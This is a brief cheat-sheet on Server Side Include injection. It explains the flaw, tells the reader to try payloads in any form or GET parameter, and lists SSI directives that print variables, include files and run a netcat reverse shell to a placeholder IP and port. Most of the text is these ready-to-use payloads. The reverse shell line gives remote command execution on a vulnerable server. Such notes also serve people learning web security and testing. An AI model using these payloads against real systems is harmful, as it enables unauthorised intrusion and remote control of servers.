# Server Side Include Injection (SSI Injection)

## Introduction
SSI (Server Side Includes) Injection is a type of web security vulnerability that occurs when a web application allows untrusted user-supplied data to be used as part of a Server Side Include (SSI) directive

## Where to find
Usually it can be found anywhere. Just try to input the payload in the form or GET parameter

## How to exploit
1. Print a date
```
<!--#echo var="DATE_LOCAL" -->
```

2. Print all the variabels
```
<!--#printenv -->
```

3. Include a file
```
<!--#include file="includefile.html" -->
```

4. Doing a reverse shell
```
<!--#exec cmd="mkfifo /tmp/foo;nc IP PORT 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
```

## References
* [OWASP](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)